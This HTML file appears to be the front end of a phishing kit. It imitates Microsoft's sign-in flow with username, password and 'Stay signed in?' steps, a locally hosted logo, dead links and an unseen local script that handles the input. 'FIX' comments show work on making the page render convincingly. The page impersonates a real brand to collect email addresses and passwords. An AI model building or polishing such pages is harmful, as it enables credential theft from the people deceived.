<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/images/favicon.ico" />
    <title>Sign in to your Microsoft account</title>
    <link rel="stylesheet" href="assets/css/style.css" />
</head>

<body>
    <!-- FIX 1: .page-bg wrapper for background image rendering -->
    <div class="page-bg">
        <!-- FIX 2: table display container so section { display: table-cell } works -->
        <div style="display: table; width: 100%; height: 100vh;">

            <section id="section_uname">
                <div class="auth-wrapper">
                    <img src="assets/images/logo.png" alt="Microsoft" />
                    <h2 class="title mb-16 mt-16">Sign in</h2>
                    <form id="uname_form">
                        <div class="mb-16">
                            <p id="error_uname" class="error"></p>
                            <input id="inp_uname" type="text" name="uname" class="input"
                                placeholder="Email, phone, or Skype" autocomplete="username" />
                        </div>
                    </form>
                    <div>
                        <p class="mb-16 fs-13">No account? <a href="#" class="link">Create one!</a></p>
                        <p class="mb-16 fs-13">
                            <a href="#" class="link">Can't access your account?</a>
                        </p>
                    </div>
                    <div>
                        <button class="btn" id="btn_next" type="button">Next</button>
                    </div>
                </div>
                <div class="opts">
                    <p class="has-icon mb-0" style="font-size:15px;">
                        <span class="icon"><img src="assets/images/key.png" width="30px" alt="Key" /></span>
                        Sign-in options
                    </p>
                </div>
            </section>

            <section id="section_pwd" class="d-none">
                <div class="auth-wrapper">
                    <img src="assets/images/logo.png" alt="Microsoft" class="d-block" />
                    <!-- FIX 3: id → class on user_identity (duplicate id is invalid HTML) -->
                    <div class="identity w-100 mt-16 mb-16">
                        <button class="back" type="button" aria-label="Go back">
                            <img src="assets/images/back.png" alt="Back" />
                        </button>
                        <span class="user_identity"></span>
                    </div>
                    <h2 class="title mb-16">Enter password</h2>
                    <form id="pwd_form">
                        <div class="mb-16">
                            <p id="error_pwd" class="error"></p>
                            <input id="inp_pwd" type="password" name="pass" class="input"
                                placeholder="Password" autocomplete="current-password" />
                        </div>
                    </form>
                    <div>
                        <p class="mb-16"><a href="#" class="link fs-13">Forgot password?</a></p>
                        <p class="mb-16"><a href="#" class="link fs-13">Other ways to sign in</a></p>
                    </div>
                    <div>
                        <button class="btn" id="btn_sig" type="button">Sign in</button>
                    </div>
                </div>
            </section>

            <section id="section_final" class="d-none">
                <div class="auth-wrapper">
                    <img src="assets/images/logo.png" alt="Microsoft" class="d-block" />
                    <!-- FIX 3 continued: class instead of id -->
                    <div class="identity w-100 mt-16 mb-16">
                        <span class="user_identity"></span>
                    </div>
                    <h2 class="title mb-16">Stay signed in?</h2>
                    <p class="p">Stay signed in so you don't have to sign in again next time.</p>
                    <label class="has-checkbox">
                        <input type="checkbox" class="checkbox" />
                        <span>Don't show this again</span>
                    </label>
                    <div class="btn-group">
                        <button class="btn btn-sec" id="btn_final_no" type="button">No</button>
                        <button class="btn" id="btn_final_yes" type="button">Yes</button>
                    </div>
                </div>
            </section>

        </div><!-- end table container -->
    </div><!-- end .page-bg -->

    <footer class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
    </footer>

    <script src="assets/index.js"></script>
</body>

</html>
